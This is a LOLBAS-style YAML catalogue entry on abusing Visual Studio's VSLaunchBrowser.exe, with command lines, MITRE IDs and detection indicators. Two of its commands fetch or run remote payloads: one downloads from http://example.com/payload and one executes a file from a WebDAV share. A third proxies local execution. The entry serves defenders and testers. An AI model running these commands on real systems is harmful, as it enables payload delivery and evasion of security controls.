---
Name: VSLaunchBrowser.exe
Description: Microsoft Visual Studio browser launcher tool for web applications debugging
Author: Avihay Eldad
Created: 2024-04-12
Commands:
  - Command: VSLaunchBrowser.exe .exe http://example.com/payload
    Description: Download and execute payload from remote server
    Usecase: It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows
    Tags:
      - Download: INetCache
  - Command: VSLaunchBrowser.exe .exe C:\Windows\System32\calc.exe
    Description: Execute payload via VSLaunchBrowser as parent process
    Usecase: It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
    Category: Execute
    Privileges: User
    MitreID: T1127
    OperatingSystem: Windows
  - Command: VSLaunchBrowser.exe .exe \\Server\Path\file
    Description: Execute payload from WebDAV server via VSLaunchBrowser as parent process
    Usecase: It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
    Category: Execute
    Privileges: User
    MitreID: T1127
    OperatingSystem: Windows
Full_Path:
  - Path: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
  - Path: C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe
Detection:
  - IOC: cmd.exe as sub-process of VSLaunchBrowser
  - IOC: URL on a VSLaunchBrowser command line
  - IOC: VSLaunchBrowser making unexpected network connections or DNS requests
Acknowledgement:
  - Person: Avihay Eldad
    Handle: '@AvihayEldad'
---